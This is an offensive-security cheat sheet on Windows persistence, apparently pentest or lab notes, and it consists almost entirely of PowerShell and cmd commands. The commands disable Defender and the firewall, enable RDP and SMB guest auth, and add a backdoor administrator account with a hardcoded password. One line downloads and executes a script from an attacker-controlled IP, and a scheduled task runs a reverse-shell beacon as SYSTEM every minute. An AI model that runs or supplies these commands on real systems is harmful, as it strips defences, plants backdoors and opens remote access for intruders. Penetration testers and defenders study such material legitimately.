# Persistence

See [ired.team](https://www.ired.team/offensive-security/persistence)

```powershell
# Disable Defender from local powershell session
Get-MPPreference
Set-MPPreference -DisableRealTimeMonitoring $true
Set-MPPreference -DisableIOAVProtection $true
Set-MPPreference -DisableIntrusionPreventionSystem $true

# View/disable firewall
netsh advfirewall show allprofiles state
netsh advfirewall set allprofiles state off

# Enable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f

# Query/enable RDP service
sc query TermService
net start TermService

# Add an administrative user to establish persistence
net user mojo Password123! /add
net localgroup administrators mojo /add

# Enable SMB guest authentication
reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f

# Run vulnerable AD
iex(new-object net.webclient).downloadstring("http://$OUR_IP/vulnad.ps1")
Invoke-VulnAD -UsersLimit 100 -DomainName "$DOMAIN"
```

```powershell
# Add a beacon that pings a reverse shell every minute
schtasks /create /sc minute /mo 1 /tn "beans" /tr C:\ProgramData\System\chillin.bat /ru "SYSTEM"
```
